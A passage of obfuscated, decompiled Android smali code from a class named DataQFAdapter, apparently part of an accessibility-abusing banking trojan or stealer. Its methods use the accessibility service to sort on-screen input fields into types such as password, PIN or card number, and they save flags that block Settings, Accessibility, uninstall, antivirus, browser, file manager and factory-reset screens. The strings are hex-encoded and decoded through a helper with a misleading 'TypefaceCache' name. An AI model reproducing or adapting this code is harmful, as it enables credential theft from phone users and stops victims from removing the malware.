    add-int/lit8 v2, v2, -0x29

    .line 26
    .line 27
    if-lt v1, v2, :cond_2

    .line 28
    .line 29
    invoke-virtual {v0}, Ljava/util/concurrent/ConcurrentHashMap;->keySet()Ljava/util/Set;

    .line 30
    .line 31
    .line 32
    move-result-object v1

    .line 33
    invoke-interface {v1}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    .line 34
    .line 35
    .line 36
    move-result-object v1

    .line 37
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    .line 38
    .line 39
    .line 40
    move-result v2

    .line 41
    if-eqz v2, :cond_2

    .line 42
    .line 43
    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 44
    .line 45
    .line 46
    invoke-interface {v1}, Ljava/util/Iterator;->remove()V

    .line 47
    .line 48
    .line 49
    :cond_2
    const/16 v1, 0x0

    .line 50
    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 51
    .line 52
    .line 53
    move-result-object v2

    .line 54
    invoke-virtual {v2, p1, v1}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    .line 55
    .line 56
    .line 57
    move-result-object v3

    .line 58
    invoke-virtual {v2, v3}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    .line 59
    .line 60
    .line 61
    move-result-object v2

    nop

    nop

    .line 62
    invoke-virtual {v2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 63
    .line 64
    .line 65
    move-result-object v2

    .line 66
    invoke-interface {v0, p1, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 67
    .line 68
    .line 69
    return-object v2

    .line 70
    :catchall_0
    invoke-static {p1, p1}, Lv/s/KgSM0TsKUpCiuePB;->PPWVWMPAUcr9AGNUSxQ(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 71
    .line 72
    .line 73
    move-result-object v0

    .line 74
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    .line 75
    .line 76
    .line 77
    move-result v2

    .line 78
    if-lez v2, :cond_3

    .line 79
    .line 80
    new-instance v2, Ljava/lang/StringBuilder;

    nop

    .line 81
    .line 82
    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    .line 83
    .line 84
    .line 85
    invoke-virtual {v0, v1}, Ljava/lang/String;->charAt(I)C

    .line 86
    .line 87
    .line 88
    move-result v1

    .line 89
    invoke-static {v1}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    .line 90
    .line 91
    .line 92
    move-result-object v1

    .line 93
    sget-object v3, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    .line 94
    .line 95
    invoke-virtual {v1, v3}, Ljava/lang/String;->toUpperCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 96
    .line 97
    .line 98
    move-result-object v1

    nop

    nop

    .line 99
    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    .line 100
    .line 101
    .line 102
    const/4 v1, 0x1

    .line 103
    invoke-virtual {v0, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    .line 104
    .line 105
    .line 106
    move-result-object v0

    .line 107
    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 108
    .line 109
    .line 110
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 111
    .line 112
    .line 113
    move-result-object v0

    nop

    .line 114
    :cond_3
    sget-object v1, Lapp/mobilex/plus/services/DataQFAdapter;->appNameCache:Ljava/util/concurrent/ConcurrentHashMap;

    .line 115
    .line 116
    invoke-interface {v1, p1, v0}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 117
    .line 118
    .line 119
    return-object v0

    nop

    nop
.end method

.method private final resolveFieldType(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Ljava/lang/String;
    .locals 11

    .line 1
    const-string v0, "002F0079005C008E00FE"

    .line 2
    .line 3
    const-string v1, "0037007300430093"

    .line 4
    .line 5
    const-string v2, "003300770048009400E700B000C000A3"

    .line 6
    .line 7
    if-eqz p2, :cond_0

    .line 8
    .line 9
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 10
    .line 11
    .line 12
    move-result-object p1

    .line 13
    return-object p1

    .line 14
    :cond_0
    :try_start_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getInputType()I

    .line 15
    .line 16
    .line 17
    move-result p2
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 18
    const-string v3, "0033007F0055"

    .line 19
    .line 20
    const-string v4, "0033007E0054008900F5"

    .line 21
    .line 22
    const-string v5, "003600640057"

    .line 23
    .line 24
    const-string v6, "0026007B005A008E00FC"

    .line 25
    .line 26
    if-eqz p2, :cond_8

    .line 27
    .line 28
    and-int/lit8 v7, p2, 0xf

    .line 29
    .line 30
    and-int/lit16 p2, p2, 0xff0

    .line 31
    .line 32
    const/16 v8, 0x10

    .line 33
    .line 34
    const/16 v9, 0x2

    .line 35
    if-ne v7, v9, :cond_1

    .line 36
    .line 37
    if-ne p2, v8, :cond_1

    nop

    .line 38
    .line 39
    :try_start_1
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 40
    .line 41
    .line 42
    move-result-object p1

    .line 43
    return-object p1

    .line 44
    :cond_1
    const/4 v10, 0x1

    .line 45
    if-ne v7, v10, :cond_6

    .line 46
    .line 47
    if-eq p2, v8, :cond_5

    .line 48
    .line 49
    const/16 p1, 0x20

    .line 50
    .line 51
    if-eq p2, p1, :cond_4

    .line 52
    .line 53
    const/16 p1, 0x60

    .line 54
    .line 55
    if-eq p2, p1, :cond_3

    .line 56
    .line 57
    const/16 p1, 0x80

    .line 58
    .line 59
    if-eq p2, p1, :cond_2

    .line 60
    .line 61
    const/16 p1, 0x90

    .line 62
    .line 63
    if-eq p2, p1, :cond_2

    .line 64
    .line 65
    const/16 p1, 0xd0

    .line 66
    .line 67
    if-eq p2, p1, :cond_4

    nop

    .line 68
    .line 69
    const/16 p1, 0xe0

    .line 70
    .line 71
    if-eq p2, p1, :cond_2

    .line 72
    .line 73
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 74
    .line 75
    .line 76
    move-result-object p1

    .line 77
    return-object p1

    .line 78
    :cond_2
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 79
    .line 80
    .line 81
    move-result-object p1

    .line 82
    return-object p1

    .line 83
    :cond_3
    const-string p1, "002D007700560082"

    .line 84
    .line 85
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 86
    .line 87
    .line 88
    move-result-object p1

    nop

    nop

    .line 89
    return-object p1

    nop

    .line 90
    :cond_4
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 91
    .line 92
    .line 93
    move-result-object p1

    .line 94
    return-object p1

    .line 95
    :cond_5
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 96
    .line 97
    .line 98
    move-result-object p1

    .line 99
    return-object p1

    .line 100
    :cond_6
    const/4 p2, 0x3

    .line 101
    if-ne v7, p2, :cond_7

    .line 102
    .line 103
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 104
    .line 105
    .line 106
    move-result-object p1

    .line 107
    return-object p1

    .line 108
    :cond_7
    if-ne v7, v9, :cond_8

    .line 109
    .line 110
    const-string p1, "002D00630056008500F500AD"

    .line 111
    .line 112
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 113
    .line 114
    .line 115
    move-result-object p1

    .line 116
    return-object p1

    .line 117
    :cond_8
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getHintText()Ljava/lang/CharSequence;

    .line 118
    .line 119
    .line 120
    move-result-object p1

    nop

    .line 121
    if-eqz p1, :cond_9

    .line 122
    .line 123
    invoke-virtual {p1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 124
    .line 125
    .line 126
    move-result-object p1

    nop

    nop

    .line 127
    if-eqz p1, :cond_9

    .line 128
    .line 129
    sget-object p2, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    .line 130
    .line 131
    invoke-virtual {p1, p2}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 132
    .line 133
    .line 134
    move-result-object p1

    .line 135
    goto/16 :goto_0

    .line 136
    :cond_9
    const-string p1, ""

    .line 137
    .line 138
    :goto_0
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 139
    .line 140
    .line 141
    move-result-object p2

    .line 142
    const/4 v7, 0x0

    .line 143
    invoke-static {p1, p2, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 144
    .line 145
    .line 146
    move-result p2

    .line 147
    if-nez p2, :cond_12

    .line 148
    .line 149
    const-string p2, "047C0426047B04D904AB0493"

    .line 150
    .line 151
    invoke-static {p2}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 152
    .line 153
    .line 154
    move-result-object p2

    .line 155
    invoke-static {p1, p2, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 156
    .line 157
    .line 158
    move-result p2

    .line 159
    if-nez p2, :cond_12

    .line 160
    .line 161
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 162
    .line 163
    .line 164
    move-result-object p2

    .line 165
    invoke-static {p1, p2, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 166
    .line 167
    .line 168
    move-result p2

    .line 169
    if-eqz p2, :cond_a

    .line 170
    .line 171
    goto/16 :goto_4

    .line 172
    .line 173
    :cond_a
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 174
    .line 175
    .line 176
    move-result-object p2

    .line 177
    invoke-static {p1, p2, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 178
    .line 179
    .line 180
    move-result p2

    .line 181
    if-nez p2, :cond_11

    nop

    nop

    .line 182
    .line 183
    const-string p2, "047C0428047C04A5"

    .line 184
    .line 185
    invoke-static {p2}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 186
    .line 187
    .line 188
    move-result-object p2

    nop

    nop

    .line 189
    invoke-static {p1, p2, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 190
    .line 191
    .line 192
    move-result p2

    .line 193
    if-nez p2, :cond_11

    .line 194
    .line 195
    const-string p2, "0026003B0056008600F900B3"

    .line 196
    .line 197
    invoke-static {p2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 198
    .line 199
    .line 200
    move-result-object p2

    .line 201
    invoke-static {p1, p2, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 202
    .line 203
    .line 204
    move-result p2

    .line 205
    if-eqz p2, :cond_b

    .line 206
    .line 207
    goto/16 :goto_3

    .line 208
    .line 209
    :cond_b
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 210
    .line 211
    .line 212
    move-result-object p2

    .line 213
    invoke-static {p1, p2, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 214
    .line 215
    .line 216
    move-result p2

    .line 217
    if-nez p2, :cond_10

    nop

    nop

    .line 218
    .line 219
    const-string p2, "04010423040004D204D404E1048F"

    .line 220
    .line 221
    invoke-static {p2}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 222
    .line 223
    .line 224
    move-result-object p2

    .line 225
    invoke-static {p1, p2, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 226
    .line 227
    .line 228
    move-result p2

    .line 229
    if-nez p2, :cond_10

    .line 230
    .line 231
    const-string p2, "047E0428040704D204D0"

    .line 232
    .line 233
    invoke-static {p2}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 234
    .line 235
    .line 236
    move-result-object p2

    .line 237
    invoke-static {p1, p2, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 238
    .line 239
    .line 240
    move-result p2

    .line 241
    if-eqz p2, :cond_c

    .line 242
    .line 243
    goto/16 :goto_2

    .line 244
    :cond_c
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 245
    .line 246
    .line 247
    move-result-object p2

    .line 248
    invoke-static {p1, p2, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 249
    .line 250
    .line 251
    move-result p2

    .line 252
    if-nez p2, :cond_f

    .line 253
    .line 254
    const-string p2, "04730422047B04D204D1"

    .line 255
    .line 256
    invoke-static {p2}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 257
    .line 258
    .line 259
    move-result-object p2

    .line 260
    invoke-static {p1, p2, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 261
    .line 262
    .line 263
    move-result p2

    .line 264
    if-nez p2, :cond_f

    .line 265
    .line 266
    const-string p2, "04020457047004DC04AA"

    .line 267
    .line 268
    invoke-static {p2}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 269
    .line 270
    .line 271
    move-result-object p2

    .line 272
    invoke-static {p1, p2, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 273
    .line 274
    .line 275
    move-result p2

    .line 276
    if-eqz p2, :cond_d

    nop

    .line 277
    .line 278
    goto :goto_1

    .line 279
    :cond_d
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 280
    .line 281
    .line 282
    move-result-object p2

    .line 283
    invoke-static {p1, p2, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 284
    .line 285
    .line 286
    move-result p2

    .line 287
    if-nez p2, :cond_e

    .line 288
    .line 289
    const-string p2, "04780428040804DF04AD"

    .line 290
    .line 291
    invoke-static {p2}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 292
    .line 293
    .line 294
    move-result-object p2

    .line 295
    invoke-static {p1, p2, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 296
    .line 297
    .line 298
    move-result p2

    .line 299
    if-nez p2, :cond_e

    .line 300
    .line 301
    const-string p2, "00360065005E0095"

    .line 302
    .line 303
    invoke-static {p2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 304
    .line 305
    .line 306
    move-result-object p2

    .line 307
    invoke-static {p1, p2, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 308
    .line 309
    .line 310
    move-result p1

    .line 311
    if-eqz p1, :cond_13

    .line 312
    .line 313
    :cond_e
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 314
    .line 315
    .line 316
    move-result-object p1

    .line 317
    return-object p1

    .line 318
    :cond_f
    :goto_1
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 319
    .line 320
    .line 321
    move-result-object p1

    .line 322
    return-object p1

    .line 323
    :cond_10
    :goto_2
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 324
    .line 325
    .line 326
    move-result-object p1

    .line 327
    return-object p1

    .line 328
    :cond_11
    :goto_3
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 329
    .line 330
    .line 331
    move-result-object p1

    .line 332
    return-object p1

    .line 333
    :cond_12
    :goto_4
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 334
    .line 335
    .line 336
    move-result-object p1

    nop

    nop
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 337
    return-object p1

    .line 338
    :catchall_0
    :cond_13
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 339
    .line 340
    .line 341
    move-result-object p1

    .line 342
    return-object p1
.end method

.method private final safePost(Ljava/lang/Runnable;)V
    .locals 3

    .line 1
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->handler:Landroid/os/Handler;

    nop

    nop

    .line 2
    .line 3
    new-instance v1, Lv/s/amn7iDop16HVW3aeX;

    .line 4
    .line 5
    const/4 v2, 0x0

    .line 6
    invoke-direct {v1, p1, v2}, Lv/s/amn7iDop16HVW3aeX;-><init>(Ljava/lang/Runnable;I)V

    .line 7
    .line 8
    .line 9
    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    .line 10
    .line 11
    .line 12
    return-void
.end method

.method private static final safePost$lambda$0(Ljava/lang/Runnable;)V
    .locals 1

    .line 1
    :try_start_0
    invoke-interface {p0}, Ljava/lang/Runnable;->run()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 2
    .line 3
    .line 4
    return-void

    .line 5
    :catchall_0
    move-exception p0

    .line 6
    const-string v0, "00300077005D008200C000B000C100B3006300730049009500FF00AD008800E7"

    .line 7
    .line 8
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 9
    .line 10
    .line 11
    invoke-virtual {p0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 12
    .line 13
    .line 14
    return-void
.end method

.method private final safePostDelayed(Ljava/lang/Runnable;J)V
    .locals 3

    .line 1
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->handler:Landroid/os/Handler;

    nop

    nop

    new-instance v1, Lv/s/amn7iDop16HVW3aeX;

    nop

    nop

    const/4 v2, 0x1

    invoke-direct {v1, p1, v2}, Lv/s/amn7iDop16HVW3aeX;-><init>(Ljava/lang/Runnable;I)V

    invoke-virtual {v0, v1, p2, p3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method private final safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V
    .locals 3
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lv/s/JRdueaGIH5g8DVCPba;",
            "J)V"
        }
    .end annotation

    .line 2
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->handler:Landroid/os/Handler;

    nop

    nop

    new-instance v1, Lv/s/hzCVl0f866ksvpzUUql;

    nop

    const/16 v2, 0x9

    invoke-direct {v1, v2, p1}, Lv/s/hzCVl0f866ksvpzUUql;-><init>(ILjava/lang/Object;)V

    invoke-virtual {v0, v1, p2, p3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method private static final safePostDelayed$lambda$1(Ljava/lang/Runnable;)V
    .locals 1

    .line 1
    :try_start_0
    invoke-interface {p0}, Ljava/lang/Runnable;->run()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 2
    .line 3
    .line 4
    return-void

    .line 5
    :catchall_0
    move-exception p0

    .line 6
    const-string v0, "00300077005D008200C000B000C100B3000700730057008600E900BA00D600E7002600640049008800E200E50092"

    .line 7
    .line 8
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 9
    .line 10
    .line 11
    invoke-virtual {p0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 12
    .line 13
    .line 14
    return-void
.end method

.method private static final safePostDelayed$lambda$2(Lv/s/JRdueaGIH5g8DVCPba;)V
    .locals 1

    .line 1
    :try_start_0
    invoke-interface {p0}, Lv/s/JRdueaGIH5g8DVCPba;->w9sT1Swbhx3hs()Ljava/lang/Object;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 2
    .line 3
    .line 4
    return-void

    .line 5
    :catchall_0
    move-exception p0

    .line 6
    const-string v0, "00300077005D008200C000B000C100B3000700730057008600E900BA00D600E7002600640049008800E200E50092"

    .line 7
    .line 8
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 9
    .line 10
    .line 11
    invoke-virtual {p0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 12
    .line 13
    .line 14
    return-void
.end method

.method private final saveUiBlockPrefs()V
    .locals 3

    .line 1
    :try_start_0
    const-string v0, "0036007F0059008B00FF00BC00D9009800330064005E008100E3"

    .line 2
    .line 3
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 4
    .line 5
    .line 6
    move-result-object v0

    .line 7
    const/4 v1, 0x0

    .line 8
    invoke-virtual {p0, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 9
    .line 10
    .line 11
    move-result-object v0

    nop

    nop

    .line 12
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    .line 13
    .line 14
    .line 15
    move-result-object v0

    .line 16
    const-string v1, "0030007E005A008300F5"

    .line 17
    .line 18
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 19
    .line 20
    .line 21
    move-result-object v1

    .line 22
    sget-boolean v2, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Shade:Z

    .line 23
    .line 24
    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 25
    .line 26
    .line 27
    const-string v1, "00300073004F0093"

    .line 28
    .line 29
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 30
    .line 31
    .line 32
    move-result-object v1

    .line 33
    sget-boolean v2, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Sett:Z

    .line 34
    .line 35
    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 36
    .line 37
    .line 38
    const-string v1, "00220027000A009E"

    .line 39
    .line 40
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 41
    .line 42
    .line 43
    move-result-object v1

    .line 44
    sget-boolean v2, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_A11y:Z

    .line 45
    .line 46
    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 47
    .line 48
    .line 49
    const-string v1, "00330079004C008200E2"

    .line 50
    .line 51
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 52
    .line 53
    .line 54
    move-result-object v1

    .line 55
    sget-boolean v2, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Power:Z

    .line 56
    .line 57
    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 58
    .line 59
    .line 60
    const-string v1, "0036007800520089"

    .line 61
    .line 62
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 63
    .line 64
    .line 65
    move-result-object v1

    .line 66
    sget-boolean v2, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Unin:Z

    nop

    nop

    .line 67
    .line 68
    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 69
    .line 70
    .line 71
    const-string v1, "002C00610055008600E000AF"

    .line 72
    .line 73
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 74
    .line 75
    .line 76
    move-result-object v1

    nop

    .line 77
    sget-boolean v2, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_OwnApp:Z

    .line 78
    .line 79
    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 80
    .line 81
    .line 82
    const-string v1, "0033007A005A009E"

    .line 83
    .line 84
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 85
    .line 86
    .line 87
    move-result-object v1

    .line 88
    sget-boolean v2, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Play:Z

    .line 89
    .line 90
    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 91
    .line 92
    .line 93
    const-string v1, "av"

    .line 94
    .line 95
    sget-boolean v2, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_AV:Z

    .line 96
    .line 97
    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 98
    .line 99
    .line 100
    const-string v1, "002100640054009000E300BA00C0"

    .line 101
    .line 102
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 103
    .line 104
    .line 105
    move-result-object v1

    .line 106
    sget-boolean v2, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Browser:Z

    .line 107
    .line 108
    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 109
    .line 110
    .line 111
    const-string v1, "0025007F0057008200E3"

    .line 112
    .line 113
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 114
    .line 115
    .line 116
    move-result-object v1

    .line 117
    sget-boolean v2, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Files:Z

    .line 118
    .line 119
    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 120
    .line 121
    .line 122
    const-string v1, "003100730048008200E4"

    .line 123
    .line 124
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 125
    .line 126
    .line 127
    move-result-object v1

    .line 128
    sget-boolean v2, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Reset:Z

    .line 129
    .line 130
